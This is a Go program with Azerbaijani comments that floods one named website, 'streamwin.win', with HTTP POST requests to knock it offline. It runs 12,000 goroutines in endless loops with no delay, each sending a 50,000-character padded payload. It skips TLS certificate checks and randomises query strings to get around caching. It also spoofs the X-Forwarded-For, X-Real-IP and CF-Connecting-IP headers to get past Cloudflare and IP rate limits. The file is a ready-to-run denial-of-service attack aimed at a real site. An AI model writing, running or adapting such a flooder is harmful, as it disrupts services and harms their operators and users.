package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"runtime"
	"strings"
	"time"
)

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	target := "https://streamwin.win"
	workers := 12000 // Railway limitində ən yüksək rəqəm

	fmt.Printf("[!] ACTIVATING ULTIMATE-FORCE ON: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives:   true, 
		MaxIdleConns:        0,
		MaxIdleConnsPerHost: 20000,
	}

	client := &http.Client{Transport: tr, Timeout: 2 * time.Second}
	
	// Serverin emal edə bilməyəcəyi qədər ağır random payload
	payload := "action=join&meeting_id=71339982630&data=" + strings.Repeat("FORCE", 10000)

	for i := 0; i < workers; i++ {
		go func(id int) {
			for {
				// Cache bypass üçün hər nanosaniyədə fərqli URL
				u := fmt.Sprintf("%s?v=%d&anti_cache=%d", target, rand.Intn(9999999), time.Now().UnixNano())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Real görünən brauzer başlıqlarını hər sorğuda random dəyişirik
				req.Header.Set("User-Agent", fmt.Sprintf("Mozilla/5.0 (%d)", rand.Intn(10000)))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				
				// IP bypass üçün spoofing massivi
				ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
				req.Header.Set("X-Forwarded-For", ip)
				req.Header.Set("X-Real-IP", ip)
				req.Header.Set("CF-Connecting-IP", ip) // Cloudflare spesifik bypass

				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
				// Gecikmə 0 (sıfır)
			}
		}(i)
	}
	select {}
}
